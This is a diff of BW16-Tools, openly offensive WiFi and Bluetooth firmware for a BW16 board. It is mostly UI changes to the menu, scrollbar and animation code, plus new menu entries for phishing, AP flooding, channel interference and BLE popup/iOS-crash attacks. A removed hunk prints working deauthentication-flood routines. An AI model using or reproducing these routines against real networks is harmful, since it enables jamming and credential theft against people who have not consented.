@@ -1,9 +1,6 @@
 /**
  * @file BW16-Tools.ino
- * @author FlyingIce
- * @brief BW16 WIFI Tools
- * @version 0.1
- * @date 2025-09-03
+ 
  * @link https://github.com/FlyingIceyyds/BW16-Tools
  */
 
@@ -54,38 +51,20 @@ class __FlashStringHelper; // forward declaration for Arduino-style flash string
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
 #include <U8g2_for_Adafruit_GFX.h>
+// BLE support (used only in BLE submenu actions)
+#include "BLEDevice.h"
+extern "C" {
+#include "gap_le.h"
+#include "gap_adv.h"
+}
 U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
 #define OLED_RESET -1
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
-// Face standby includes
-#include "face/Common.h"
-#include "face/Face.h"
-#include "face/FaceEmotions.hpp"
-// Force-include face sources so Arduino builder links them
-#include "face/AsyncTimer.cpp"
-#include "face/Eye.cpp"
-#include "face/EyeBlink.cpp"
-#include "face/EyeTransformation.cpp"
-#include "face/EyeTransition.cpp"
-#include "face/EyeVariation.cpp"
-#include "face/BlinkAssistant.cpp"
-#include "face/LookAssistant.cpp"
-#include "face/FaceExpression.cpp"
-#include "face/FaceBehavior.cpp"
-#include "face/Face.cpp"
-
-// Provide adapter instance for face module
-U8g2Adapter u8g2;
-
-// Standby face state
-static bool g_standbyFaceActive = false;
-static Face* g_face = nullptr;
-static unsigned long g_faceLastRandomizeMs = 0;
-static const unsigned long FACE_RANDOMIZE_INTERVAL_MS = 4000;
-
 const int UI_RIGHT_GUTTER = 10; // 右侧预留滚动条与箭头区域（加宽以留出更协调的间距）
+// 控制在通用基础绘制中是否强制显示占位滚动条（用于BLE动画避免闪烁）
+static bool g_forceScrollbarAlwaysForGeneric = false;
 // 动画配置（优化启动速度）
 const int ANIM_STEPS = 6;       // 动画步数（更顺滑）
 const int ANIM_DELAY_MS = 0;    // 通用每步延时（非选择框移动场景）
@@ -94,10 +73,19 @@ const int SELECT_MOVE_TOTAL_MS = 60;
 // 动画刷帧频率控制：每隔多少帧调用一次 display.display（减少刷新次数）
 const int DISPLAY_FLUSH_EVERY_FRAMES = 2;
 // 启动动画（更短）
-const int TITLE_FRAMES = 20;     // 增加闪烁次数（启动仍保持<1s）
-const int TITLE_DELAY_MS = 25;   // 每帧延时
+const int TITLE_FRAMES = 25;     // 简化启动动画：减少帧数
+const int TITLE_DELAY_MS = 20;   // 每帧延时
 // 控制选择动画是否跳过（用于翻页时避免重复播放）
 static bool g_skipNextSelectAnim = false;
+
+// 菜单长名称滚动播放功能
+static bool g_scrollEnabled = false;  // 是否启用滚动
+static unsigned long g_scrollStartTime = 0;  // 开始滚动的时间
+static const unsigned long SCROLL_DELAY_MS = 1500;  // 选中后等待1.5秒开始滚动
+static const unsigned long SCROLL_SPEED_MS = 50;  // 滚动速度
+static String g_scrollLabel = "";  // 当前滚动的标签
+static int g_scrollOffset = 0;  // 当前滚动偏移量
+static const int SCROLL_LABEL_PADDING = 20;  // 滚动时的左右边距
 
 // 按键引脚定义
 #define BTN_DOWN PA12
@@ -132,7 +120,6 @@ void showModalMessage(const String& line1, const String& line2 = String(""));
 bool showConfirmModal(const String& line1,
                       const String& leftHint = String("《 取消"),
                       const String& rightHint = String("确认 》"));
-bool showSelectSSIDConfirmModal();
 
 // ===== Home Menu: unified registry and actions =====
 typedef void (*HomeAction)();
@@ -141,19 +128,32 @@ struct HomeMenuItem {
   HomeAction action;
 };
 
+// Forward declarations for BLE actions and menus
+void bleHeadsetTest();
+void blePopupMenu();
+void blePopupStart_iOS();
+void blePopupStart_iOSActionModal();
+void blePopupStart_iOS17Crash();
+void blePlaceholderPage();
+void homeActionBleTest();
+void homeActionBlePopupTest();
+void bleBeaconDeviceMenu();
+
 // Forward declarations for home actions (handlers)
 void homeActionSelectSSID();
 void homeActionAttackMenu();
 void homeActionQuickScan();
 void homeActionPhishing();
 void homeActionConnInterfere();
-void homeActionBeaconTamper();
 void homeActionApFlood();
 void homeActionAttackDetect();
 void homeActionPacketMonitor();
 void homeActionDeepScan();
 void homeActionWebUI();
-void homeActionQuickCapture();
+
+// Root menu enter actions
+void rootActionEnterWifi();
+void rootActionEnterBle();
 
 // VARIABLES
 typedef struct {
@@ -177,11 +177,11 @@ SelectedAP _selectedNetwork;
 // Provide AP_Channel compatible getter used by handshake.h
 String AP_Channel = String(0);
 
-// static String bytesToStr(const uint8_t* mac, int len) { // 未使用的函数
-//   char buf[3*6];
-//   int n = 0; for (int i=0;i<len;i++){ n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]); }
-//   return String(buf);
-// }
+static __attribute__((unused)) String bytesToStr(const uint8_t* mac, int len) {
+  char buf[3*6];
+  int n = 0; for (int i=0;i<len;i++){ n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]); }
+  return String(buf);
+}
 
 // Credentials for you Wifi network
 char *ssid = "";
@@ -279,8 +279,6 @@ static inline bool is24GChannel(int ch) {
   return ch >= 1 && ch <= 14;
 }
 
- 
-
 static inline bool is5GChannel(int ch) {
   return ch >= 36; // 简化判断：常见5G信道在36及以上
 }
@@ -305,27 +303,51 @@ int attackstate = 0;
 int menustate = 0;
 int deauthstate = 0; 
 int scrollindex = 0;
-int perdeauth = 10;  // 增加攻击强度
+int perdeauth = 3;
 int num = 0; // 添加全局变量声明
 
-// 首页分页起始索引（与攻击页相同的滚动效果）
+// Menu mode
+enum MenuMode { MENU_ROOT = 0, MENU_WIFI = 1, MENU_BLE = 2 };
+static MenuMode g_menuMode = MENU_ROOT;
+
+// Root menu state
+static int rootStartIndex = 0;
+static int rootState = 0;
+
+// BLE submenu state
+static int bleStartIndex = 0;
+static int bleState = 0;
+
+// WiFi submenu (existing home) state
 int homeStartIndex = 0;
-// 首页相对选择索引（与攻击页的attackstate类似）
 int homeState = 0; // 初始化为0，对应第一项
 
-// Unified registry: add new items here only (main menu)
+// Root menu (top-level)
+static const HomeMenuItem g_rootMenuItems[] = {
+  {"WIFI の 功能", rootActionEnterWifi},
+  {"蓝牙 の 功能",  rootActionEnterBle}
+};
+static const int g_rootMenuCount = (int)(sizeof(g_rootMenuItems) / sizeof(g_rootMenuItems[0]));
+
+// BLE submenu (简化结构)
+static const HomeMenuItem g_bleMenuItems[] = {
+  {"蓝牙信标广播", bleBeaconDeviceMenu},
+  {"蓝牙弹窗攻击", blePopupMenu},
+  {"返回根菜单", rootActionEnterRoot}
+};
+static const int g_bleMenuCount = (int)(sizeof(g_bleMenuItems) / sizeof(g_bleMenuItems[0]));
+
+// Unified registry: add new items here only (WiFi submenu)
 static const HomeMenuItem g_homeMenuItems[] = {
   {"选择AP/SSID",            homeActionSelectSSID},
   {"常规攻击[Attack]",       homeActionAttackMenu},
   {"快速扫描[Scan]",         homeActionQuickScan},
   {"密码钓鱼[Phishing]",     homeActionPhishing},
   {"连接/信道干扰[CI]",      homeActionConnInterfere},
-  {"广播黑洞[BBH]",           homeActionBeaconTamper},
   {"AP洪水攻击[Dos]",        homeActionApFlood},
   {"攻击帧检测[Detect]",     homeActionAttackDetect},
   {"监视器[Monitor]",        homeActionPacketMonitor},
   {"深度扫描 DeepScan",      homeActionDeepScan},
-  {"快速抓包[Capture]",      homeActionQuickCapture},
   {"启动[Web UI]",           homeActionWebUI}
 };
 static const int g_homeMenuCount = (int)(sizeof(g_homeMenuItems) / sizeof(g_homeMenuItems[0]));
@@ -333,9 +355,9 @@ static inline int getHomeMaxItems() { return g_homeMenuCount; }
 #define HOME_MAX_ITEMS (getHomeMaxItems())
 
 const int HOME_PAGE_SIZE = 3;
-const int HOME_ITEM_HEIGHT = 20; // 增加行高以占满屏幕高度
+const int HOME_ITEM_HEIGHT = 20; // 极简科技风：紧凑布局
 const int HOME_Y_OFFSET = 2;
-const int HOME_RECT_HEIGHT = 18; // 增加矩形高度
+const int HOME_RECT_HEIGHT = 18; // 极简科技风：精致高度
 
 // Web UI相关变量
 bool web_ui_active = false;
@@ -344,79 +366,6 @@ bool web_server_active = false;
 bool dns_server_active = false;
 // Handshake sniffer running flag (used by WebUI and handshake.h)
 bool hs_sniffer_running = false;
-
-// 快速抓包相关变量
-bool quick_capture_active = false;
-bool quick_capture_completed = false;
-int quick_capture_mode = 0; // 0=主动, 1=被动, 2=高效
-unsigned long quick_capture_start_time = 0;
-
-// ============ 非阻塞攻击状态管理系统 ============
-// 攻击运行状态枚举
-enum AttackMode {
-  ATTACK_IDLE = 0,
-  ATTACK_SINGLE,
-  ATTACK_MULTI,
-  ATTACK_AUTO_SINGLE,
-  ATTACK_AUTO_MULTI,
-  ATTACK_ALL,
-  ATTACK_BEACON_DEAUTH
-};
-
-// 非阻塞攻击状态管理
-struct DeauthAttackState {
-  AttackMode mode;
-  bool running;
-  
-  // 时间管理
-  unsigned long lastPacketMs;
-  unsigned long lastUIUpdateMs;
-  unsigned long lastButtonCheckMs;
-  unsigned long lastLEDToggleMs;
-  unsigned long lastScanMs;
-  
-  // 目标索引管理
-  size_t currentTargetIndex;
-  size_t currentChannelBucketIndex;
-  size_t currentBssidIndexInBucket;
-  
-  // 统计
-  int packetCount;
-  bool ledState;
-  
-  // 配置
-  unsigned int packetsPerCycle;
-  unsigned int uiUpdateInterval;
-  unsigned int buttonCheckInterval;
-  unsigned int ledBlinkInterval;
-  
-  // 信道缓存
-  int lastChannel;
-  bool channelSet;
-};
-
-// 全局攻击状态实例
-DeauthAttackState g_deauthState = {
-  .mode = ATTACK_IDLE,
-  .running = false,
-  .lastPacketMs = 0,
-  .lastUIUpdateMs = 0,
-  .lastButtonCheckMs = 0,
-  .lastLEDToggleMs = 0,
-  .lastScanMs = 0,
-  .currentTargetIndex = 0,
-  .currentChannelBucketIndex = 0,
-  .currentBssidIndexInBucket = 0,
-  .packetCount = 0,
-  .ledState = false,
-  .packetsPerCycle = 10,
-  .uiUpdateInterval = 500,
-  .buttonCheckInterval = 100,
-  .ledBlinkInterval = 500,
-  .lastChannel = -1,
-  .channelSet = false
-};
-unsigned long quick_capture_end_time = 0;
 
 // 钓鱼模式一次性锁：关闭后禁止再次启动，需重启设备
 bool g_webTestLocked = false;
@@ -449,8 +398,6 @@ static bool webtest_border_flash_visible = true;
 	static uint8_t phishingTargetBSSID[6] = {0};
 	static unsigned long lastPhishingDeauthMs = 0;
 	static unsigned long lastPhishingBroadcastMs = 0;
-	static int phishingDeauthInterval = 500; // 动态间隔：根据客户端连接情况调整
-	static int phishingBatchSize = 10; // 动态批次数：根据客户端连接情况调整
 
 // 攻击检测边框效果变量
 static bool detect_border_always_on = false;
@@ -614,8 +561,6 @@ static void switchToNextChannelGroup() {
   }
 }
 
-
-
 // BW16/RTL8720DN: 2.4GHz 常用检测信道（保留兼容性）
 static const uint8_t detectChannels24G[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
 static volatile unsigned long g_promiscCbHits = 0;
@@ -772,7 +717,6 @@ static void promiscPacketDetectCallback(unsigned char *buf, unsigned int len, vo
       uint8_t type = (fc >> 2) & 0x3;
       uint8_t subtype = (fc >> 4) & 0xF;
       
-      
       // 只检测解除认证帧（subtype=12）和解除关联帧（subtype=10）
       if (type == 0) { // 管理帧
         bool isDeauth = (subtype == 12);
@@ -791,8 +735,13 @@ static void promiscPacketDetectCallback(unsigned char *buf, unsigned int len, vo
   }
 }
 
+// 前向声明，实际实现在BLE变量声明之后
+static void checkBleResourcesForWiFi();
+
 // 启动数据包侦测
 static void startPacketDetection() {
+  Serial.println("启动数据包监视器...");
+  
   g_packetCount = 0;
   g_packetDetectTotalPackets = 0;
   g_packetDetectRunning = true;
@@ -1944,124 +1893,6 @@ inline __attribute__((always_inline)) void sendDeauthBurstToBssidUs(const uint8_
     }
   }
 }
-
-// ============ 优化的非阻塞批量发送函数 ============
-// 全局增强模式开关
-bool g_enhancedDeauthMode = true; // 默认启用增强模式
-
-// 高效批量发送：预构建帧，减少重复memcpy
-inline void sendDeauthBatch(const uint8_t* bssid, int batchSize, int &packetCount) {
-  static DeauthFrame frames[3]; // 静态缓存3个原因码的帧
-  static bool initialized = false;
-  static uint8_t lastBssid[6] = {0};
-  
-  // 检查是否需要重新初始化帧（BSSID变化时）
-  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
-    for (int i = 0; i < 3; i++) {
-      memcpy(frames[i].source, bssid, 6);
-      memcpy(frames[i].access_point, bssid, 6);
-      memcpy(frames[i].destination, BROADCAST_MAC, 6);
-      frames[i].reason = DEAUTH_REASONS[i];
-    }
-    memcpy(lastBssid, bssid, 6);
-    initialized = true;
-  }
-  
-  // 无延时连续发送
-  for (int batch = 0; batch < batchSize; batch++) {
-    for (int i = 0; i < 3; i++) {
-      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
-      packetCount++;
-    }
-  }
-}
-
-// 增强版批量发送：双向攻击，更强效果
-inline void sendDeauthBatchEnhanced(const uint8_t* bssid, int batchSize, int &packetCount) {
-  static DeauthFrame frames[6]; // 增加到6帧：3个原因码 x 2个方向
-  static bool initialized = false;
-  static uint8_t lastBssid[6] = {0};
-  
-  // 检查是否需要重新初始化帧（BSSID变化时）
-  if (!initialized || memcmp(lastBssid, bssid, 6) != 0) {
-    // AP -> Client 方向（原有）
-    for (int i = 0; i < 3; i++) {
-      memcpy(frames[i].source, bssid, 6);
-      memcpy(frames[i].access_point, bssid, 6);
-      memcpy(frames[i].destination, BROADCAST_MAC, 6);
-      frames[i].reason = DEAUTH_REASONS[i];
-    }
-    // Client -> AP 方向（增强）
-    for (int i = 0; i < 3; i++) {
-      memcpy(frames[i+3].source, BROADCAST_MAC, 6);
-      memcpy(frames[i+3].access_point, bssid, 6);
-      memcpy(frames[i+3].destination, bssid, 6);
-      frames[i+3].reason = DEAUTH_REASONS[i];
-    }
-    memcpy(lastBssid, bssid, 6);
-    initialized = true;
-  }
-  
-  // 增强的发送逻辑：每批次发送多轮
-  for (int batch = 0; batch < batchSize; batch++) {
-    // 双向发送，增加成功率
-    for (int i = 0; i < 6; i++) {
-      wifi_tx_raw_frame(&frames[i], sizeof(DeauthFrame));
-      packetCount++;
-    }
-  }
-}
-
-// 针对顽固目标的增强版本
-inline void sendDeauthBurstIntensive(const uint8_t* bssid, int burstCount, int &packetCount) {
-  DeauthFrame frame;
-  const uint16_t intensiveReasons[] = {1, 2, 3, 4, 5, 6, 7, 8, 15, 16}; // 10个原因码
-  
-  for (int burst = 0; burst < burstCount; burst++) {
-    // AP -> Broadcast
-    for (int r = 0; r < 10; r++) {
-      memcpy(frame.source, bssid, 6);
-      memcpy(frame.access_point, bssid, 6);
-      memcpy(frame.destination, BROADCAST_MAC, 6);
-      frame.reason = intensiveReasons[r];
-      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
-      packetCount++;
-    }
-    // Broadcast -> AP
-    for (int r = 0; r < 10; r++) {
-      memcpy(frame.source, BROADCAST_MAC, 6);
-      memcpy(frame.access_point, bssid, 6);
-      memcpy(frame.destination, bssid, 6);
-      frame.reason = intensiveReasons[r];
-      wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
-      packetCount++;
-    }
-  }
-}
-
-// 优化的信道设置函数（避免重复设置）
-inline void setChannelOptimized(int channel) {
-  if (!g_deauthState.channelSet || g_deauthState.lastChannel != channel) {
-    wext_set_channel(WLAN0_NAME, channel);
-    g_deauthState.lastChannel = channel;
-    g_deauthState.channelSet = true;
-  }
-}
-
-// 统一的攻击停止函数
-void stopAttack() {
-  g_deauthState.running = false;
-  g_deauthState.mode = ATTACK_IDLE;
-  g_deauthState.channelSet = false;
-  g_deauthState.lastChannel = -1;
-  
-  // 关闭LED
-  digitalWrite(LED_R, LOW);
-  digitalWrite(LED_G, LOW);
-  digitalWrite(LED_B, LOW);
-  
-  Serial.println("=== 攻击已停止 ===");
-}
 // timing variables
 unsigned long lastDownTime = 0;
 unsigned long lastUpTime = 0;
@@ -2085,7 +1916,32 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
     char bssid_str[] = "XX:XX:XX:XX:XX:XX";
     snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
     result.bssid_str = bssid_str;
-    scan_results.push_back(result);
+    // 去重：如果同一BSSID已存在，则仅更新更强RSSI并跳过插入
+    bool isDuplicate = false;
+    for (size_t i = 0; i < scan_results.size(); i++) {
+      bool same = true;
+      for (int k = 0; k < 6; k++) {
+        if (scan_results[i].bssid[k] != result.bssid[k]) { same = false; break; }
+      }
+      if (same) {
+        // 可选：若SSID为空而新结果有名称，或RSSI更强，则更新
+        if (scan_results[i].ssid.length() == 0 && result.ssid.length() > 0) {
+          scan_results[i].ssid = result.ssid;
+        }
+        if (result.rssi > scan_results[i].rssi) {
+          scan_results[i].rssi = result.rssi;
+          scan_results[i].channel = result.channel;
+          scan_results[i].security_type = result.security_type;
+          memcpy(&scan_results[i].bssid, &result.bssid, 6);
+          scan_results[i].bssid_str = result.bssid_str;
+        }
+        isDuplicate = true;
+        break;
+      }
+    }
+    if (!isDuplicate) {
+      scan_results.push_back(result);
+    }
   } else {
     // 扫描完成
     g_scanDone = true;
@@ -2094,9 +1950,49 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
 }
 // 移除未使用的 selectedmenu()
 
+// 应急WiFi状态检测和恢复
+static bool emergencyWiFiRecovery() {
+  static unsigned long lastRecoveryAttempt = 0;
+  unsigned long now = millis();
+  
+  // 防止频繁恢复尝试
+  if (now - lastRecoveryAttempt < 30000) { // 30秒内最多一次
+    return false;
+  }
+  
+  Serial.println("=== 检测到WiFi异常，执行应急恢复 ===");
+  lastRecoveryAttempt = now;
+  
+  // 1. 强制清理所有状态
+  scan_results.clear();
+  scan_results.shrink_to_fit();
+  SelectedVector.clear();
+  SelectedVector.shrink_to_fit();
+  g_scanDone = false;
+  
+  // 2. 强制重置WiFi硬件
+  Serial.println("强制重置WiFi硬件...");
+  wifi_off();
+  delay(1000); // 更长的重置时间
+  wifi_on(RTW_MODE_AP);
+  delay(1000);
+  
+  // 3. 重新启动AP
+  String channelStr = String(current_channel);
+  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
+    Serial.println("应急恢复: AP重启成功");
+    return true;
+  } else {
+    Serial.println("应急恢复: AP重启失败");
+    return false;
+  }
+}
+
 int scanNetworks() {
   DEBUG_SER_PRINT("Scanning WiFi Networks...");
+  
   scan_results.clear();
+  scan_results.reserve(64); // 预分配内存，避免频繁重新分配
   SelectedVector.clear(); // 清空选中的WiFi列表
   g_scanDone = false;
   unsigned long startMs = millis();
@@ -2111,6 +2007,11 @@ int scanNetworks() {
     return 0;
   } else {
     DEBUG_SER_PRINT(" Failed!\n");
+    // 扫描失败时尝试应急恢复
+    if (scan_results.empty()) {
+      Serial.println("扫描失败且无结果，尝试应急恢复...");
+      emergencyWiFiRecovery();
+    }
     return 1;
   }
 }
@@ -2282,16 +2183,18 @@ static inline int advanceUtf8Index(const String& s, int start) {
 
 // ===== UI Helpers: rounded highlight, chevron =====
 void drawRightChevron(int y, int lineHeight, bool isSelected) {
-  int x = display.width() - UI_RIGHT_GUTTER - 8; // 向左移动箭头
+  int x = display.width() - UI_RIGHT_GUTTER - 6;
   int ymid = y + lineHeight / 2;
   int color = isSelected ? SSD1306_BLACK : SSD1306_WHITE;
-  display.fillTriangle(x, ymid - 3, x, ymid + 3, x + 4, ymid, color);
+  
+  display.drawLine(x, ymid - 3, x + 3, ymid, color);
+  display.drawLine(x + 3, ymid, x, ymid + 3, color);
 }
 
 void drawRoundedHighlight(int y, int height) {
-  int width = display.width() - UI_RIGHT_GUTTER; // 预留右侧滚动条区域
-  int radius = 2; // 稍微减小圆角
-  display.fillRoundRect(0, y, width, height, radius, SSD1306_WHITE);
+  int width = display.width() - UI_RIGHT_GUTTER;
+  display.drawRect(0, y, width, height, WHITE);
+  display.fillRect(1, y + 1, width - 2, height - 2, WHITE);
 }
 
 // ===== OLED single-line helpers =====
@@ -2320,27 +2223,27 @@ static inline bool oledMaybeDrawCenteredLine(const char* text, int baselineY, un
 
 // 首页滚动条
 void drawHomeScrollbar(int startIndex) {
-  // 如果一页即可显示全部，不绘制滚动条
   if (HOME_MAX_ITEMS <= HOME_PAGE_SIZE) return;
 
-  int barX = display.width() - UI_RIGHT_GUTTER + 1; // 靠近右侧边缘内侧
-  int barWidth = UI_RIGHT_GUTTER - 2; // 留出1px内边距
+  int barX = display.width() - UI_RIGHT_GUTTER + 1;
+  int barWidth = UI_RIGHT_GUTTER - 2;
   int trackY = HOME_Y_OFFSET;
   int trackH = HOME_ITEM_HEIGHT * HOME_PAGE_SIZE;
 
-  // 轨道（浅色描边）
-  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
+  display.drawRect(barX, trackY, barWidth, trackH, WHITE);
 
-  // 滑块高度按页占比
   float pageRatio = (float)HOME_PAGE_SIZE / (float)HOME_MAX_ITEMS;
   int computedThumb = (int)(trackH * pageRatio);
-  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
-  // 滑块位置按起始索引比例
-  float posRatio = (float)startIndex / (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
+  int thumbH = (computedThumb < 4) ? 4 : computedThumb;
+
+  float denom = (float)(HOME_MAX_ITEMS - HOME_PAGE_SIZE);
+  float posRatio = denom > 0.0f ? (startIndex / denom) : 0.0f;
+  if (posRatio < 0.0f) posRatio = 0.0f;
+  if (posRatio > 1.0f) posRatio = 1.0f;
   int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
 
-  // 滑块
-  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
+  display.drawRect(barX + 1, thumbY, barWidth - 2, thumbH, WHITE);
+  display.fillRect(barX + 2, thumbY + 1, barWidth - 4, thumbH - 2, WHITE);
 }
 
 // 动画版滚动条：支持浮点起始索引以实现平滑过渡
@@ -2655,6 +2558,199 @@ void drawHomeMenuBasePaged_NoFlush(int startIndex) {
   drawHomeScrollbar(startIndex);
 }
 void drawHomeMenuBasePagedShim() { drawHomeMenuBasePaged_NoFlush(g_homeBaseStartIndex); }
+
+// ====== 通用菜单（可复用 WiFi 菜单样式与逻辑） ======
+
+// 通用滚动条（指定总项数与页大小）
+static inline void drawScrollbarGeneric(int totalCount, int pageSize, int startIndex) {
+  if (totalCount <= pageSize) return;
+  int barX = display.width() - UI_RIGHT_GUTTER + 1;
+  int barWidth = UI_RIGHT_GUTTER - 2;
+  int trackY = HOME_Y_OFFSET;
+  int trackH = HOME_ITEM_HEIGHT * pageSize;
+  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
+  float pageRatio = (float)pageSize / (float)totalCount;
+  int computedThumb = (int)(trackH * pageRatio);
+  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
+  float denom = (float)(totalCount - pageSize);
+  float posRatio = denom > 0.0f ? ((float)startIndex / denom) : 0.0f;
+  if (posRatio < 0.0f) posRatio = 0.0f;
+  if (posRatio > 1.0f) posRatio = 1.0f;
+  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
+  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
+}
+static inline void drawScrollbarFractionGeneric(int totalCount, int pageSize, float startIndexF) {
+  if (totalCount <= pageSize) return;
+  int barX = display.width() - UI_RIGHT_GUTTER + 1;
+  int barWidth = UI_RIGHT_GUTTER - 2;
+  int trackY = HOME_Y_OFFSET;
+  int trackH = HOME_ITEM_HEIGHT * pageSize;
+  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
+  float pageRatio = (float)pageSize / (float)totalCount;
+  int computedThumb = (int)(trackH * pageRatio);
+  int thumbH = (computedThumb < 6) ? 6 : computedThumb;
+  float denom = (float)(totalCount - pageSize);
+  float posRatio = denom > 0.0f ? (startIndexF / denom) : 0.0f;
+  if (posRatio < 0.0f) posRatio = 0.0f;
+  if (posRatio > 1.0f) posRatio = 1.0f;
+  int thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
+  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
+}
+
+// 始终绘制滚动条（占位用）：即便一页可展示全部，也显示轨道与最小拇指
+static inline void drawScrollbarGenericAlways(int totalCount, int pageSize, int startIndex) {
+  int barX = display.width() - UI_RIGHT_GUTTER + 1;
+  int barWidth = UI_RIGHT_GUTTER - 2;
+  int trackY = HOME_Y_OFFSET;
+  int trackH = HOME_ITEM_HEIGHT * pageSize;
+  display.drawRoundRect(barX, trackY, barWidth, trackH, 2, SSD1306_WHITE);
+
+  int thumbH;
+  int thumbY;
+  if (totalCount <= pageSize) {
+    // 不需要分页时，绘制居中的竖线占位，左右与轨道留出间距
+    int lineHMargin = 3; // 顶部和底部间距
+    thumbH = trackH - lineHMargin * 2;
+    if (thumbH < 6) thumbH = 6;
+    thumbY = trackY + (trackH - thumbH) / 2;
+
+    int minLineWidth = 2;
+    int maxLineWidth = 3;
+    int lineW = barWidth / 4; // 基于轨道宽度估算合适粗细
+    if (lineW < minLineWidth) lineW = minLineWidth;
+    if (lineW > maxLineWidth) lineW = maxLineWidth;
+    int sideMargin = (barWidth - lineW) / 2; // 与轨道左右留白
+    // 稍微向左偏移1px，让其位于轨道内部的中间偏左
+    int lineX = barX + 1 + sideMargin - 1;
+    if (lineX < barX + 1) lineX = barX + 1; // 保证不贴边
+    display.fillRect(lineX, thumbY, lineW, thumbH, SSD1306_WHITE);
+    return;
+  } else {
+    float pageRatio = (float)pageSize / (float)totalCount;
+    int computedThumb = (int)(trackH * pageRatio);
+    thumbH = (computedThumb < 6) ? 6 : computedThumb;
+    float denom = (float)(totalCount - pageSize);
+    float posRatio = denom > 0.0f ? ((float)startIndex / denom) : 0.0f;
+    if (posRatio < 0.0f) posRatio = 0.0f;
+    if (posRatio > 1.0f) posRatio = 1.0f;
+    thumbY = trackY + (int)((trackH - thumbH) * posRatio + 0.5f);
+  }
+  display.fillRoundRect(barX + 1, thumbY, barWidth - 2, thumbH, 2, SSD1306_WHITE);
+}
+
+
+// 通用基础页绘制（不刷新）：复用WiFi菜单样式
+static void drawMenuBasePaged_NoFlush_Generic(const HomeMenuItem* items, int itemCount, int startIndex) {
+  display.clearDisplay();
+  display.setTextSize(1);
+  int visible = (HOME_PAGE_SIZE < (itemCount - startIndex)) ? HOME_PAGE_SIZE : (itemCount - startIndex);
+  for (int i = 0; i < visible; i++) {
+    int idx = startIndex + i;
+    if (idx >= itemCount) break;
+    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT;
+    int textY = rectY + 13;
+    String label = items[idx].label;
+    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
+    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
+    if (labelWidth > maxTextWidth) {
+      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
+        label.remove(label.length() - 1);
+        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
+      }
+      label += "..";
+    }
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    u8g2_for_adafruit_gfx.setCursor(5, textY);
+    u8g2_for_adafruit_gfx.print(label);
+    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
+  }
+  if (g_forceScrollbarAlwaysForGeneric) {
+    drawScrollbarGenericAlways(itemCount, HOME_PAGE_SIZE, startIndex);
+  } else {
+    drawScrollbarGeneric(itemCount, HOME_PAGE_SIZE, startIndex);
+  }
+}
+
+// 通用页绘制（带y偏移、不刷新）：用于翻页动画
+static inline void drawMenuPageWithOffset_NoFlush_Generic(const HomeMenuItem* items, int itemCount, int startIndex, int yOffset) {
+  display.setTextSize(1);
+  int visible = (HOME_PAGE_SIZE < (itemCount - startIndex)) ? HOME_PAGE_SIZE : (itemCount - startIndex);
+  for (int i = 0; i < visible; i++) {
+    int idx = startIndex + i;
+    if (idx >= itemCount) break;
+    int rectY = HOME_Y_OFFSET + i * HOME_ITEM_HEIGHT + yOffset;
+    int textY = rectY + 13;
+    if (rectY > display.height() || rectY + HOME_RECT_HEIGHT < 0) continue;
+    String label = items[idx].label;
+    int maxTextWidth = display.width() - UI_RIGHT_GUTTER - 15;
+    int labelWidth = u8g2_for_adafruit_gfx.getUTF8Width(label.c_str());
+    if (labelWidth > maxTextWidth) {
+      while (label.length() > 0 && u8g2_for_adafruit_gfx.getUTF8Width(label.c_str()) > maxTextWidth - 20) {
+        label.remove(label.length() - 1);
+        while (label.length() > 0 && ((uint8_t)label[label.length()-1] & 0xC0) == 0x80) { label.remove(label.length() - 1); }
+      }
+      label += "..";
+    }
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    u8g2_for_adafruit_gfx.setCursor(5, textY);
+    u8g2_for_adafruit_gfx.print(label);
+    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
+  }
+}
+
+// 通用翻页动画
+static inline void animateMenuPageFlip_Generic(const HomeMenuItem* items, int itemCount, int fromStartIndex, int toStartIndex) {
+  if (fromStartIndex == toStartIndex) return;
+  int delta = toStartIndex - fromStartIndex;
